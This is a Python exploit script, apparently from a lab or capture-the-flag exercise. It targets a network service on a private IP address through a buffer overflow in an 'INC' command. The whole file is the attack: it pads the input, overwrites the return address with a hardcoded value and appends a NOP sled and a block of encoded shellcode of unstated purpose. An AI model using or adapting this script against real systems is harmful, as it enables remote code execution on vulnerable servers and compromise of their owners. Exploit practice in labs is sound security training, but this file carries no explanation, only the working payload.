#!/usr/bin/python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#info of host
host = "192.168.195.237" #remember to change again before running
port = 2223

sock.connect((host, port))

#receive initial welcome message
response = sock.recv(2048)
print(response)

#try giving input of increasing lengths
length = 20
buffer = b"INC " + b"A"*length
#50352249 but backwards
overwrite = b"\x49\x22\x35\x50"
nopsled = b"\x90"*100

buf =  b""
buf += b"\xba\xb6\xf6\xad\xc3\xdb\xc1\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x59\x31\x53\x14\x83\xc3\x04\x03\x53"
buf += b"\x10\x54\x03\x51\x2b\x17\xec\xaa\xac\x47\x64\x4f"
buf += b"\x9d\x55\x12\x1b\x8c\x69\x50\x49\x3d\x02\x34\x7a"
buf += b"\x32\xa3\xf3\xa4\x7d\x34\x88\xdb\x55\xfb\x4f\xb7"
buf += b"\x9a\x9a\x33\xca\xce\x7c\x0d\x05\x03\x7d\x4a\xd3"
buf += b"\x69\x92\x06\x6f\xc3\x7c\x2c\x2d\xd8\x2b\x33\x62"
buf += b"\xab\x93\x4b\x07\x6c\x67\xe0\x06\xbd\x0c\xb0\x10"
buf += b"\x6d\x99\x19\x01\x8c\x4e\x1c\x88\xfa\x4c\x2e\xf4"
buf += b"\x4a\x27\x64\x81\x4c\xe1\xb4\x55\xe2\xcc\x78\x58"
buf += b"\xfa\x09\xbe\x83\x89\x61\xbc\x3e\x8a\xb2\xbe\xe4"
buf += b"\x1f\x24\x18\x6e\x87\x80\x98\xa3\x5e\x43\x96\x08"
buf += b"\x14\x0b\xbb\x8f\xf9\x20\xc7\x04\xfc\xe6\x41\x5e"
buf += b"\xdb\x22\x09\x04\x42\x73\xf7\xeb\x7b\x63\x5f\x53"
buf += b"\xde\xe8\x72\x82\x5e\x11\x8d\xab\x02\x85\x41\x66"
buf += b"\xbd\x55\xce\xf1\xce\x67\x51\xaa\x58\xcb\x1a\x74"
buf += b"\x9e\x5a\x0c\x87\x70\xe4\x5d\x79\x71\x14\x77\xbe"
buf += b"\x25\x44\xef\x17\x46\x0f\xef\x98\x93\xa5\xe5\x0e"
buf += b"\xdc\x91\x37\xb4\xb4\xe3\xc7\x6e\x4a\x6a\x21\x20"
buf += b"\x04\x3c\xfe\x81\xf4\xfc\xae\x69\x1f\xf3\x91\x8a"
buf += b"\x20\xde\xb9\x21\xcf\xb6\x92\xdd\x76\x93\x69\x7f"
buf += b"\x76\x0e\x14\xbf\xfc\xba\xe8\x0e\xf5\xcf\xfa\x67"
buf += b"\x62\x2f\x03\x78\x07\x2f\x69\x7c\x81\x78\x05\x7e"
buf += b"\xf4\x4e\x8a\x81\xd3\xcd\xcd\x7e\xa2\xe7\xa6\x49"
buf += b"\x30\x47\xd1\xb5\xd4\x47\x21\xe0\xbe\x47\x49\x54"
buf += b"\x9b\x14\x6c\x9b\x36\x09\x3d\x0e\xb9\x7b\x91\x99"
buf += b"\xd1\x81\xcc\xee\x7d\x7a\x3b\x6d\x79\x84\xb9\x5a"
buf += b"\x22\xec\x41\xdb\xd2\xec\x2b\xdb\x82\x84\xa0\xf4"
buf += b"\x2d\x64\x48\xdf\x65\xec\xc3\x8e\xc4\x8d\xd4\x9a"
buf += b"\x89\x13\xd4\x29\x12\xa4\xaf\x42\xa5\x45\x50\x4b"
buf += b"\xc2\x46\x50\x73\xf4\x7b\x86\x4a\x82\xba\x1a\xe9"
buf += b"\x9d\x89\x3f\x58\x34\xf1\x6c\x9a\x1d"


payload = buffer + overwrite + nopsled + buf

print("Sending Payload of size " + str(length))
sock.send(payload)

response = sock.recv(2048)
#response = sock.recv(2048)
print(response.decode())
